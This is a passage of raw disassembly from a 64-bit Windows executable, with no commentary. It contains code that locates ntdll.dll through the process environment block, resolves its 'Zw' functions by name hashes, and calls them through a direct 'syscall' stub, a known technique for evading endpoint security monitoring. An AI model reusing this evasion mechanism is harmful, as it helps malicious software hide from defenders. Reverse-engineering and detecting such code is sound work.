   140004e3b:	e8 76 03 00 00       	call   0x1400051b6
   140004e40:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140004e45:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp
   140004e49:	5b                   	pop    %rbx
   140004e4a:	5e                   	pop    %rsi
   140004e4b:	5f                   	pop    %rdi
   140004e4c:	5d                   	pop    %rbp
   140004e4d:	41 5c                	pop    %r12
   140004e4f:	c3                   	ret
   140004e50:	ba 23 7b ee b9       	mov    $0xb9ee7b23,%edx
   140004e55:	80 39 00             	cmpb   $0x0,(%rcx)
   140004e58:	74 23                	je     0x140004e7d
   140004e5a:	45 31 c0             	xor    %r8d,%r8d
   140004e5d:	31 c0                	xor    %eax,%eax
   140004e5f:	90                   	nop
   140004e60:	0f b7 04 01          	movzwl (%rcx,%rax,1),%eax
   140004e64:	41 89 d1             	mov    %edx,%r9d
   140004e67:	41 83 c0 01          	add    $0x1,%r8d
   140004e6b:	41 c1 c9 08          	ror    $0x8,%r9d
   140004e6f:	44 01 c8             	add    %r9d,%eax
   140004e72:	31 c2                	xor    %eax,%edx
   140004e74:	44 89 c0             	mov    %r8d,%eax
   140004e77:	80 3c 01 00          	cmpb   $0x0,(%rcx,%rax,1)
   140004e7b:	75 e3                	jne    0x140004e60
   140004e7d:	89 d0                	mov    %edx,%eax
   140004e7f:	c3                   	ret
   140004e80:	41 56                	push   %r14
   140004e82:	41 55                	push   %r13
   140004e84:	41 54                	push   %r12
   140004e86:	55                   	push   %rbp
   140004e87:	57                   	push   %rdi
   140004e88:	56                   	push   %rsi
   140004e89:	53                   	push   %rbx
   140004e8a:	44 8b 15 ef 25 38 00 	mov    0x3825ef(%rip),%r10d        # 0x140387480
   140004e91:	45 85 d2             	test   %r10d,%r10d
   140004e94:	0f 85 c4 01 00 00    	jne    0x14000505e
   140004e9a:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   140004ea1:	00 00 
   140004ea3:	48 8b 40 18          	mov    0x18(%rax),%rax
   140004ea7:	48 8b 48 10          	mov    0x10(%rax),%rcx
   140004eab:	48 8b 41 30          	mov    0x30(%rcx),%rax
   140004eaf:	48 85 c0             	test   %rax,%rax
   140004eb2:	0f 84 b6 01 00 00    	je     0x14000506e
   140004eb8:	45 31 c9             	xor    %r9d,%r9d
   140004ebb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004ec0:	48 89 c2             	mov    %rax,%rdx
   140004ec3:	48 63 40 3c          	movslq 0x3c(%rax),%rax
   140004ec7:	8b 84 02 88 00 00 00 	mov    0x88(%rdx,%rax,1),%eax
   140004ece:	85 c0                	test   %eax,%eax
   140004ed0:	74 2d                	je     0x140004eff
   140004ed2:	4c 8d 0c 02          	lea    (%rdx,%rax,1),%r9
   140004ed6:	41 8b 41 0c          	mov    0xc(%r9),%eax
   140004eda:	48 01 d0             	add    %rdx,%rax
   140004edd:	44 8b 00             	mov    (%rax),%r8d
   140004ee0:	41 81 c8 20 20 20 20 	or     $0x20202020,%r8d
   140004ee7:	41 81 f8 6e 74 64 6c 	cmp    $0x6c64746e,%r8d
   140004eee:	75 0f                	jne    0x140004eff
   140004ef0:	8b 40 04             	mov    0x4(%rax),%eax
   140004ef3:	0d 20 20 20 20       	or     $0x20202020,%eax
   140004ef8:	3d 6c 2e 64 6c       	cmp    $0x6c642e6c,%eax
   140004efd:	74 15                	je     0x140004f14
   140004eff:	48 8b 09             	mov    (%rcx),%rcx
   140004f02:	48 8b 41 30          	mov    0x30(%rcx),%rax
   140004f06:	48 85 c0             	test   %rax,%rax
   140004f09:	75 b5                	jne    0x140004ec0
   140004f0b:	4d 85 c9             	test   %r9,%r9
   140004f0e:	0f 84 5a 01 00 00    	je     0x14000506e
   140004f14:	41 8b 41 18          	mov    0x18(%r9),%eax
   140004f18:	4c 8d 2d 65 25 38 00 	lea    0x382565(%rip),%r13        # 0x140387484
   140004f1f:	45 31 db             	xor    %r11d,%r11d
   140004f22:	41 8b 79 24          	mov    0x24(%r9),%edi
   140004f26:	45 8b 61 1c          	mov    0x1c(%r9),%r12d
   140004f2a:	8d 48 ff             	lea    -0x1(%rax),%ecx
   140004f2d:	41 8b 41 20          	mov    0x20(%r9),%eax
   140004f31:	48 01 d7             	add    %rdx,%rdi
   140004f34:	48 8d 1c 4f          	lea    (%rdi,%rcx,2),%rbx
   140004f38:	49 01 d4             	add    %rdx,%r12
   140004f3b:	48 01 d0             	add    %rdx,%rax
   140004f3e:	48 8d 34 88          	lea    (%rax,%rcx,4),%rsi
   140004f42:	eb 18                	jmp    0x140004f5c
   140004f44:	0f 1f 40 00          	nopl   0x0(%rax)
   140004f48:	48 8d 43 fe          	lea    -0x2(%rbx),%rax
   140004f4c:	48 83 ee 04          	sub    $0x4,%rsi
   140004f50:	48 39 df             	cmp    %rbx,%rdi
   140004f53:	0f 84 87 00 00 00    	je     0x140004fe0
   140004f59:	48 89 c3             	mov    %rax,%rbx
   140004f5c:	8b 06                	mov    (%rsi),%eax
   140004f5e:	48 01 d0             	add    %rdx,%rax
   140004f61:	66 81 38 5a 77       	cmpw   $0x775a,(%rax)
   140004f66:	75 e0                	jne    0x140004f48
   140004f68:	80 38 00             	cmpb   $0x0,(%rax)
   140004f6b:	44 89 d9             	mov    %r11d,%ecx
   140004f6e:	49 8d 6c cd 00       	lea    0x0(%r13,%rcx,8),%rbp
   140004f73:	0f 84 02 01 00 00    	je     0x14000507b
   140004f79:	80 78 01 00          	cmpb   $0x0,0x1(%rax)
   140004f7d:	41 b8 f6 1e 54 9a    	mov    $0x9a541ef6,%r8d
   140004f83:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004f88:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140004f8e:	74 1e                	je     0x140004fae
   140004f90:	0f b7 0c 08          	movzwl (%rax,%rcx,1),%ecx
   140004f94:	45 89 c6             	mov    %r8d,%r14d
   140004f97:	41 83 c1 01          	add    $0x1,%r9d
   140004f9b:	41 c1 ce 08          	ror    $0x8,%r14d
   140004f9f:	44 01 f1             	add    %r14d,%ecx
   140004fa2:	41 31 c8             	xor    %ecx,%r8d
   140004fa5:	44 89 c9             	mov    %r9d,%ecx
   140004fa8:	80 3c 08 00          	cmpb   $0x0,(%rax,%rcx,1)
   140004fac:	75 e2                	jne    0x140004f90
   140004fae:	0f b7 03             	movzwl (%rbx),%eax
   140004fb1:	44 89 45 00          	mov    %r8d,0x0(%rbp)
   140004fb5:	41 83 c3 01          	add    $0x1,%r11d
   140004fb9:	41 81 fb f4 01 00 00 	cmp    $0x1f4,%r11d
   140004fc0:	41 8b 04 84          	mov    (%r12,%rax,4),%eax
   140004fc4:	89 45 04             	mov    %eax,0x4(%rbp)
   140004fc7:	0f 85 7b ff ff ff    	jne    0x140004f48
   140004fcd:	c7 05 a9 24 38 00 f4 	movl   $0x1f4,0x3824a9(%rip)        # 0x140387480
   140004fd4:	01 00 00 
   140004fd7:	41 b9 f3 01 00 00    	mov    $0x1f3,%r9d
   140004fdd:	eb 12                	jmp    0x140004ff1
   140004fdf:	90                   	nop
   140004fe0:	45 8d 4b ff          	lea    -0x1(%r11),%r9d
   140004fe4:	41 83 fb 01          	cmp    $0x1,%r11d
   140004fe8:	44 89 1d 91 24 38 00 	mov    %r11d,0x382491(%rip)        # 0x140387480
   140004fef:	74 6d                	je     0x14000505e
   140004ff1:	41 8d 73 fe          	lea    -0x2(%r11),%esi
   140004ff5:	48 8d 1d 90 24 38 00 	lea    0x382490(%rip),%rbx        # 0x14038748c
   140004ffc:	0f 1f 40 00          	nopl   0x0(%rax)
   140005000:	44 89 d8             	mov    %r11d,%eax
   140005003:	44 29 d0             	sub    %r10d,%eax
   140005006:	83 f8 01             	cmp    $0x1,%eax
   140005009:	74 4a                	je     0x140005055
   14000500b:	48 8d 05 72 24 38 00 	lea    0x382472(%rip),%rax        # 0x140387484
   140005012:	89 f2                	mov    %esi,%edx
   140005014:	44 29 d2             	sub    %r10d,%edx
   140005017:	4c 8d 04 d3          	lea    (%rbx,%rdx,8),%r8
   14000501b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005020:	8b 50 04             	mov    0x4(%rax),%edx
   140005023:	8b 48 0c             	mov    0xc(%rax),%ecx
   140005026:	39 d1                	cmp    %edx,%ecx
   140005028:	73 22                	jae    0x14000504c
   14000502a:	66 0f 6e 00          	movd   (%rax),%xmm0
   14000502e:	66 0f 6e d2          	movd   %edx,%xmm2
   140005032:	66 0f 6e d9          	movd   %ecx,%xmm3
   140005036:	66 0f 6e 48 08       	movd   0x8(%rax),%xmm1
   14000503b:	66 0f 62 c2          	punpckldq %xmm2,%xmm0
   14000503f:	66 0f d6 40 08       	movq   %xmm0,0x8(%rax)
   140005044:	66 0f 62 cb          	punpckldq %xmm3,%xmm1
   140005048:	66 0f d6 08          	movq   %xmm1,(%rax)
   14000504c:	48 83 c0 08          	add    $0x8,%rax
   140005050:	49 39 c0             	cmp    %rax,%r8
   140005053:	75 cb                	jne    0x140005020
   140005055:	41 83 c2 01          	add    $0x1,%r10d
   140005059:	45 39 ca             	cmp    %r9d,%r10d
   14000505c:	72 a2                	jb     0x140005000
   14000505e:	b8 01 00 00 00       	mov    $0x1,%eax
   140005063:	5b                   	pop    %rbx
   140005064:	5e                   	pop    %rsi
   140005065:	5f                   	pop    %rdi
   140005066:	5d                   	pop    %rbp
   140005067:	41 5c                	pop    %r12
   140005069:	41 5d                	pop    %r13
   14000506b:	41 5e                	pop    %r14
   14000506d:	c3                   	ret
   14000506e:	31 c0                	xor    %eax,%eax
   140005070:	5b                   	pop    %rbx
   140005071:	5e                   	pop    %rsi
   140005072:	5f                   	pop    %rdi
   140005073:	5d                   	pop    %rbp
   140005074:	41 5c                	pop    %r12
   140005076:	41 5d                	pop    %r13
   140005078:	41 5e                	pop    %r14
   14000507a:	c3                   	ret
   14000507b:	41 b8 23 7b ee b9    	mov    $0xb9ee7b23,%r8d
   140005081:	e9 28 ff ff ff       	jmp    0x140004fae
   140005086:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000508d:	00 00 00 
   140005090:	53                   	push   %rbx
   140005091:	48 83 ec 20          	sub    $0x20,%rsp
   140005095:	89 cb                	mov    %ecx,%ebx
   140005097:	e8 e4 fd ff ff       	call   0x140004e80
   14000509c:	89 c2                	mov    %eax,%edx
   14000509e:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400050a3:	85 d2                	test   %edx,%edx
   1400050a5:	74 27                	je     0x1400050ce
   1400050a7:	8b 15 d3 23 38 00    	mov    0x3823d3(%rip),%edx        # 0x140387480
   1400050ad:	85 d2                	test   %edx,%edx
   1400050af:	74 1d                	je     0x1400050ce
   1400050b1:	48 8d 0d cc 23 38 00 	lea    0x3823cc(%rip),%rcx        # 0x140387484
   1400050b8:	31 c0                	xor    %eax,%eax
   1400050ba:	eb 0d                	jmp    0x1400050c9
   1400050bc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400050c0:	48 83 c0 01          	add    $0x1,%rax
   1400050c4:	48 39 d0             	cmp    %rdx,%rax
   1400050c7:	74 0f                	je     0x1400050d8
   1400050c9:	39 1c c1             	cmp    %ebx,(%rcx,%rax,8)
   1400050cc:	75 f2                	jne    0x1400050c0
   1400050ce:	48 83 c4 20          	add    $0x20,%rsp
   1400050d2:	5b                   	pop    %rbx
   1400050d3:	c3                   	ret
   1400050d4:	0f 1f 40 00          	nopl   0x0(%rax)
   1400050d8:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400050dd:	48 83 c4 20          	add    $0x20,%rsp
   1400050e1:	5b                   	pop    %rbx
   1400050e2:	c3                   	ret
   1400050e3:	90                   	nop
   1400050e4:	90                   	nop
   1400050e5:	90                   	nop
   1400050e6:	90                   	nop
   1400050e7:	90                   	nop
   1400050e8:	90                   	nop
   1400050e9:	90                   	nop
   1400050ea:	90                   	nop
   1400050eb:	90                   	nop
   1400050ec:	90                   	nop
   1400050ed:	90                   	nop
   1400050ee:	90                   	nop
   1400050ef:	90                   	nop
   1400050f0:	58                   	pop    %rax
   1400050f1:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   1400050f6:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   1400050fb:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140005100:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140005105:	48 83 ec 28          	sub    $0x28,%rsp
   140005109:	4c 89 d1             	mov    %r10,%rcx
   14000510c:	e8 7f ff ff ff       	call   0x140005090
   140005111:	48 83 c4 28          	add    $0x28,%rsp
   140005115:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
   14000511a:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
   14000511f:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
   140005124:	4c 8b 4c 24 20       	mov    0x20(%rsp),%r9
   140005129:	49 89 ca             	mov    %rcx,%r10
   14000512c:	0f 05                	syscall
   14000512e:	c3                   	ret
   14000512f:	49 c7 c2 7a 58 d8 5c 	mov    $0x5cd8587a,%r10
   140005136:	e8 b5 ff ff ff       	call   0x1400050f0
   14000513b:	49 ba ac 84 24 81 00 	movabs $0x812484ac,%r10
   140005142:	00 00 00 
   140005145:	e8 a6 ff ff ff       	call   0x1400050f0
   14000514a:	49 ba ca b6 7d ee 00 	movabs $0xee7db6ca,%r10
   140005151:	00 00 00 
   140005154:	e8 97 ff ff ff       	call   0x1400050f0
   140005159:	49 ba 6e a2 79 d2 00 	movabs $0xd279a26e,%r10
   140005160:	00 00 00 
   140005163:	e8 88 ff ff ff       	call   0x1400050f0
   140005168:	49 c7 c2 89 9f 9b 29 	mov    $0x299b9f89,%r10
   14000516f:	e8 7c ff ff ff       	call   0x1400050f0
   140005174:	49 c7 c2 ed c0 db 53 	mov    $0x53dbc0ed,%r10
   14000517b:	e8 70 ff ff ff       	call   0x1400050f0
   140005180:	49 c7 c2 33 1e aa 30 	mov    $0x30aa1e33,%r10
   140005187:	e8 64 ff ff ff       	call   0x1400050f0
   14000518c:	49 ba 10 f3 ad ea 00 	movabs $0xeaadf310,%r10
   140005193:	00 00 00 
   140005196:	e8 55 ff ff ff       	call   0x1400050f0
   14000519b:	49 c7 c2 75 5e e8 70 	mov    $0x70e85e75,%r10
   1400051a2:	e8 49 ff ff ff       	call   0x1400050f0
   1400051a7:	49 ba 7f b2 45 e3 00 	movabs $0xe345b27f,%r10
   1400051ae:	00 00 00 
   1400051b1:	e8 3a ff ff ff       	call   0x1400050f0
   1400051b6:	49 c7 c2 eb 62 41 64 	mov    $0x644162eb,%r10
   1400051bd:	e8 2e ff ff ff       	call   0x1400050f0
   1400051c2:	49 c7 c2 14 5f bc 13 	mov    $0x13bc5f14,%r10
   1400051c9:	e8 22 ff ff ff       	call   0x1400050f0
   1400051ce:	49 c7 c2 25 38 8e 36 	mov    $0x368e3825,%r10
   1400051d5:	e8 16 ff ff ff       	call   0x1400050f0
   1400051da:	49 c7 c2 73 39 9a 49 	mov    $0x499a3973,%r10
   1400051e1:	e8 0a ff ff ff       	call   0x1400050f0
   1400051e6:	49 c7 c2 33 2b 9d 3d 	mov    $0x3d9d2b33,%r10
   1400051ed:	e8 fe fe ff ff       	call   0x1400050f0
   1400051f2:	49 ba f0 ec 15 80 00 	movabs $0x8015ecf0,%r10
   1400051f9:	00 00 00 
   1400051fc:	e8 ef fe ff ff       	call   0x1400050f0
   140005201:	49 ba 99 52 cc 90 00 	movabs $0x90cc5299,%r10
   140005208:	00 00 00 
   14000520b:	e8 e0 fe ff ff       	call   0x1400050f0
   140005210:	49 ba a3 c1 3e e2 00 	movabs $0xe23ec1a3,%r10
   140005217:	00 00 00 
   14000521a:	e8 d1 fe ff ff       	call   0x1400050f0
   14000521f:	49 c7 c2 49 4d 94 0e 	mov    $0xe944d49,%r10
   140005226:	e8 c5 fe ff ff       	call   0x1400050f0
   14000522b:	49 c7 c2 0c d8 a5 07 	mov    $0x7a5d80c,%r10
   140005232:	e8 b9 fe ff ff       	call   0x1400050f0
   140005237:	49 ba b2 01 de f2 00 	movabs $0xf2de01b2,%r10
   14000523e:	00 00 00 
   140005241:	e8 aa fe ff ff       	call   0x1400050f0
   140005246:	49 c7 c2 66 76 d9 62 	mov    $0x62d97666,%r10
   14000524d:	e8 9e fe ff ff       	call   0x1400050f0
   140005252:	49 c7 c2 0b 4f dd 35 	mov    $0x35dd4f0b,%r10
   140005259:	e8 92 fe ff ff       	call   0x1400050f0
   14000525e:	49 ba c8 63 a2 9c 00 	movabs $0x9ca263c8,%r10
   140005265:	00 00 00 
   140005268:	e8 83 fe ff ff       	call   0x1400050f0
   14000526d:	49 c7 c2 74 43 d5 77 	mov    $0x77d54374,%r10
   140005274:	e8 77 fe ff ff       	call   0x1400050f0
   140005279:	49 ba c7 c8 4f d2 00 	movabs $0xd24fc8c7,%r10
   140005280:	00 00 00 
   140005283:	e8 68 fe ff ff       	call   0x1400050f0
   140005288:	90                   	nop
   140005289:	90                   	nop
   14000528a:	90                   	nop
   14000528b:	90                   	nop
   14000528c:	90                   	nop
   14000528d:	90                   	nop
   14000528e:	90                   	nop
   14000528f:	90                   	nop
   140005290:	48 83 ec 28          	sub    $0x28,%rsp
   140005294:	48 8b 05 a5 31 38 00 	mov    0x3831a5(%rip),%rax        # 0x140388440
   14000529b:	48 8b 00             	mov    (%rax),%rax
   14000529e:	48 85 c0             	test   %rax,%rax
   1400052a1:	74 1d                	je     0x1400052c0
   1400052a3:	ff d0                	call   *%rax
   1400052a5:	48 8b 05 94 31 38 00 	mov    0x383194(%rip),%rax        # 0x140388440
   1400052ac:	48 8d 50 08          	lea    0x8(%rax),%rdx
   1400052b0:	48 8b 40 08          	mov    0x8(%rax),%rax
   1400052b4:	48 89 15 85 31 38 00 	mov    %rdx,0x383185(%rip)        # 0x140388440
   1400052bb:	48 85 c0             	test   %rax,%rax
   1400052be:	75 e3                	jne    0x1400052a3
   1400052c0:	48 83 c4 28          	add    $0x28,%rsp
   1400052c4:	c3                   	ret
   1400052c5:	90                   	nop
   1400052c6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400052cd:	00 00 00 
   1400052d0:	56                   	push   %rsi
   1400052d1:	53                   	push   %rbx
   1400052d2:	48 83 ec 28          	sub    $0x28,%rsp
   1400052d6:	48 8b 0d 63 48 38 00 	mov    0x384863(%rip),%rcx        # 0x140389b40
   1400052dd:	48 8b 11             	mov    (%rcx),%rdx
   1400052e0:	83 fa ff             	cmp    $0xffffffff,%edx
   1400052e3:	89 d0                	mov    %edx,%eax
   1400052e5:	74 39                	je     0x140005320
   1400052e7:	85 c0                	test   %eax,%eax
   1400052e9:	74 20                	je     0x14000530b
   1400052eb:	89 c2                	mov    %eax,%edx
   1400052ed:	83 e8 01             	sub    $0x1,%eax
   1400052f0:	48 8d 1c d1          	lea    (%rcx,%rdx,8),%rbx
   1400052f4:	48 29 c2             	sub    %rax,%rdx
   1400052f7:	48 8d 74 d1 f8       	lea    -0x8(%rcx,%rdx,8),%rsi
   1400052fc:	0f 1f 40 00          	nopl   0x0(%rax)
   140005300:	ff 13                	call   *(%rbx)
   140005302:	48 83 eb 08          	sub    $0x8,%rbx
   140005306:	48 39 f3             	cmp    %rsi,%rbx
   140005309:	75 f5                	jne    0x140005300
   14000530b:	48 8d 0d 7e ff ff ff 	lea    -0x82(%rip),%rcx        # 0x140005290
   140005312:	48 83 c4 28          	add    $0x28,%rsp
   140005316:	5b                   	pop    %rbx
   140005317:	5e                   	pop    %rsi
   140005318:	e9 03 c2 ff ff       	jmp    0x140001520
   14000531d:	0f 1f 00             	nopl   (%rax)
   140005320:	31 c0                	xor    %eax,%eax
   140005322:	eb 02                	jmp    0x140005326
   140005324:	89 d0                	mov    %edx,%eax
   140005326:	44 8d 40 01          	lea    0x1(%rax),%r8d
   14000532a:	4a 83 3c c1 00       	cmpq   $0x0,(%rcx,%r8,8)
   14000532f:	4c 89 c2             	mov    %r8,%rdx
   140005332:	75 f0                	jne    0x140005324
   140005334:	eb b1                	jmp    0x1400052e7
   140005336:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000533d:	00 00 00 
   140005340:	8b 05 0a 6d 38 00    	mov    0x386d0a(%rip),%eax        # 0x14038c050
   140005346:	85 c0                	test   %eax,%eax
   140005348:	74 06                	je     0x140005350
   14000534a:	c3                   	ret
   14000534b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005350:	c7 05 f6 6c 38 00 01 	movl   $0x1,0x386cf6(%rip)        # 0x14038c050
   140005357:	00 00 00 
   14000535a:	e9 71 ff ff ff       	jmp    0x1400052d0
   14000535f:	90                   	nop
   140005360:	48 83 ec 28          	sub    $0x28,%rsp
   140005364:	83 fa 03             	cmp    $0x3,%edx
   140005367:	74 17                	je     0x140005380
   140005369:	85 d2                	test   %edx,%edx
   14000536b:	74 13                	je     0x140005380
   14000536d:	b8 01 00 00 00       	mov    $0x1,%eax
   140005372:	48 83 c4 28          	add    $0x28,%rsp
   140005376:	c3                   	ret
   140005377:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000537e:	00 00 
   140005380:	e8 6b 0b 00 00       	call   0x140005ef0
   140005385:	b8 01 00 00 00       	mov    $0x1,%eax
   14000538a:	48 83 c4 28          	add    $0x28,%rsp
   14000538e:	c3                   	ret
   14000538f:	90                   	nop
   140005390:	56                   	push   %rsi
   140005391:	53                   	push   %rbx
   140005392:	48 83 ec 28          	sub    $0x28,%rsp
   140005396:	48 8b 05 83 47 38 00 	mov    0x384783(%rip),%rax        # 0x140389b20
   14000539d:	83 38 02             	cmpl   $0x2,(%rax)
   1400053a0:	74 06                	je     0x1400053a8
   1400053a2:	c7 00 02 00 00 00    	movl   $0x2,(%rax)
   1400053a8:	83 fa 02             	cmp    $0x2,%edx
   1400053ab:	74 13                	je     0x1400053c0
   1400053ad:	83 fa 01             	cmp    $0x1,%edx
   1400053b0:	74 40                	je     0x1400053f2
   1400053b2:	b8 01 00 00 00       	mov    $0x1,%eax
   1400053b7:	48 83 c4 28          	add    $0x28,%rsp
   1400053bb:	5b                   	pop    %rbx
   1400053bc:	5e                   	pop    %rsi
   1400053bd:	c3                   	ret
   1400053be:	66 90                	xchg   %ax,%ax
   1400053c0:	48 8d 1d 99 8c 38 00 	lea    0x388c99(%rip),%rbx        # 0x14038e060
   1400053c7:	48 8d 35 92 8c 38 00 	lea    0x388c92(%rip),%rsi        # 0x14038e060
   1400053ce:	48 39 de             	cmp    %rbx,%rsi
   1400053d1:	74 df                	je     0x1400053b2
   1400053d3:	48 8b 03             	mov    (%rbx),%rax
   1400053d6:	48 85 c0             	test   %rax,%rax
   1400053d9:	74 02                	je     0x1400053dd
   1400053db:	ff d0                	call   *%rax
   1400053dd:	48 83 c3 08          	add    $0x8,%rbx
   1400053e1:	48 39 de             	cmp    %rbx,%rsi
   1400053e4:	75 ed                	jne    0x1400053d3
   1400053e6:	b8 01 00 00 00       	mov    $0x1,%eax
   1400053eb:	48 83 c4 28          	add    $0x28,%rsp
   1400053ef:	5b                   	pop    %rbx
   1400053f0:	5e                   	pop    %rsi
   1400053f1:	c3                   	ret
   1400053f2:	e8 f9 0a 00 00       	call   0x140005ef0
   1400053f7:	b8 01 00 00 00       	mov    $0x1,%eax
   1400053fc:	48 83 c4 28          	add    $0x28,%rsp
   140005400:	5b                   	pop    %rbx
   140005401:	5e                   	pop    %rsi
   140005402:	c3                   	ret
   140005403:	0f 1f 00             	nopl   (%rax)
   140005406:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000540d:	00 00 00 
   140005410:	31 c0                	xor    %eax,%eax
   140005412:	c3                   	ret
   140005413:	90                   	nop
   140005414:	90                   	nop
   140005415:	90                   	nop
   140005416:	90                   	nop
   140005417:	90                   	nop
   140005418:	90                   	nop
   140005419:	90                   	nop
   14000541a:	90                   	nop
   14000541b:	90                   	nop
   14000541c:	90                   	nop
   14000541d:	90                   	nop
   14000541e:	90                   	nop
   14000541f:	90                   	nop
   140005420:	56                   	push   %rsi
   140005421:	53                   	push   %rbx
   140005422:	48 83 ec 78          	sub    $0x78,%rsp
   140005426:	0f 29 74 24 40       	movaps %xmm6,0x40(%rsp)
   14000542b:	0f 29 7c 24 50       	movaps %xmm7,0x50(%rsp)
   140005430:	44 0f 29 44 24 60    	movaps %xmm8,0x60(%rsp)
   140005436:	83 39 06             	cmpl   $0x6,(%rcx)
   140005439:	0f 87 d1 00 00 00    	ja     0x140005510
   14000543f:	8b 01                	mov    (%rcx),%eax
   140005441:	48 8d 15 1c 41 38 00 	lea    0x38411c(%rip),%rdx        # 0x140389564
   140005448:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
   14000544c:	48 01 d0             	add    %rdx,%rax
   14000544f:	ff e0                	jmp    *%rax
   140005451:	48 8d 1d f8 3f 38 00 	lea    0x383ff8(%rip),%rbx        # 0x140389450
   140005458:	48 8b 71 08          	mov    0x8(%rcx),%rsi
   14000545c:	f2 44 0f 10 41 20    	movsd  0x20(%rcx),%xmm8
   140005462:	f2 0f 10 79 18       	movsd  0x18(%rcx),%xmm7
   140005467:	f2 0f 10 71 10       	movsd  0x10(%rcx),%xmm6
   14000546c:	b9 02 00 00 00       	mov    $0x2,%ecx
   140005471:	e8 ca 61 00 00       	call   0x14000b640
   140005476:	f2 44 0f 11 44 24 30 	movsd  %xmm8,0x30(%rsp)
   14000547d:	49 89 f1             	mov    %rsi,%r9
   140005480:	49 89 d8             	mov    %rbx,%r8
   140005483:	f2 0f 11 7c 24 28    	movsd  %xmm7,0x28(%rsp)
   140005489:	48 8d 15 a8 40 38 00 	lea    0x3840a8(%rip),%rdx        # 0x140389538
   140005490:	48 89 c1             	mov    %rax,%rcx
   140005493:	f2 0f 11 74 24 20    	movsd  %xmm6,0x20(%rsp)
   140005499:	e8 f2 65 00 00       	call   0x14000ba90
   14000549e:	90                   	nop
   14000549f:	0f 28 74 24 40       	movaps 0x40(%rsp),%xmm6
   1400054a4:	31 c0                	xor    %eax,%eax
   1400054a6:	0f 28 7c 24 50       	movaps 0x50(%rsp),%xmm7
   1400054ab:	44 0f 28 44 24 60    	movaps 0x60(%rsp),%xmm8
   1400054b1:	48 83 c4 78          	add    $0x78,%rsp
   1400054b5:	5b                   	pop    %rbx
   1400054b6:	5e                   	pop    %rsi
   1400054b7:	c3                   	ret
   1400054b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400054bf:	00 
   1400054c0:	48 8d 1d a9 3f 38 00 	lea    0x383fa9(%rip),%rbx        # 0x140389470
   1400054c7:	eb 8f                	jmp    0x140005458
   1400054c9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400054d0:	48 8d 1d 09 40 38 00 	lea    0x384009(%rip),%rbx        # 0x1403894e0
   1400054d7:	e9 7c ff ff ff       	jmp    0x140005458
   1400054dc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400054e0:	48 8d 1d d1 3f 38 00 	lea    0x383fd1(%rip),%rbx        # 0x1403894b8
   1400054e7:	e9 6c ff ff ff       	jmp    0x140005458
   1400054ec:	0f 1f 40 00          	nopl   0x0(%rax)
   1400054f0:	48 8d 1d 99 3f 38 00 	lea    0x383f99(%rip),%rbx        # 0x140389490
   1400054f7:	e9 5c ff ff ff       	jmp    0x140005458
   1400054fc:	0f 1f 40 00          	nopl   0x0(%rax)
   140005500:	48 8d 1d 0f 40 38 00 	lea    0x38400f(%rip),%rbx        # 0x140389516
   140005507:	e9 4c ff ff ff       	jmp    0x140005458
   14000550c:	0f 1f 40 00          	nopl   0x0(%rax)
   140005510:	48 8d 1d 29 3f 38 00 	lea    0x383f29(%rip),%rbx        # 0x140389440
   140005517:	e9 3c ff ff ff       	jmp    0x140005458
   14000551c:	90                   	nop
   14000551d:	90                   	nop
   14000551e:	90                   	nop
   14000551f:	90                   	nop
   140005520:	31 c0                	xor    %eax,%eax
   140005522:	c3                   	ret
   140005523:	90                   	nop
   140005524:	90                   	nop
   140005525:	90                   	nop
   140005526:	90                   	nop
   140005527:	90                   	nop
   140005528:	90                   	nop
   140005529:	90                   	nop
   14000552a:	90                   	nop
   14000552b:	90                   	nop
   14000552c:	90                   	nop
   14000552d:	90                   	nop
   14000552e:	90                   	nop
   14000552f:	90                   	nop
   140005530:	db e3                	fninit
   140005532:	c3                   	ret
   140005533:	90                   	nop
   140005534:	90                   	nop
   140005535:	90                   	nop
   140005536:	90                   	nop
   140005537:	90                   	nop
   140005538:	90                   	nop
   140005539:	90                   	nop
   14000553a:	90                   	nop
   14000553b:	90                   	nop
   14000553c:	90                   	nop
   14000553d:	90                   	nop
   14000553e:	90                   	nop
   14000553f:	90                   	nop
   140005540:	56                   	push   %rsi
   140005541:	53                   	push   %rbx
   140005542:	48 83 ec 38          	sub    $0x38,%rsp
   140005546:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   14000554b:	48 89 cb             	mov    %rcx,%rbx
   14000554e:	b9 02 00 00 00       	mov    $0x2,%ecx
   140005553:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
   140005558:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
   14000555d:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
   140005562:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140005567:	e8 d4 60 00 00       	call   0x14000b640
   14000556c:	41 b8 1b 00 00 00    	mov    $0x1b,%r8d
   140005572:	ba 01 00 00 00       	mov    $0x1,%edx
   140005577:	48 8d 0d 02 40 38 00 	lea    0x384002(%rip),%rcx        # 0x140389580
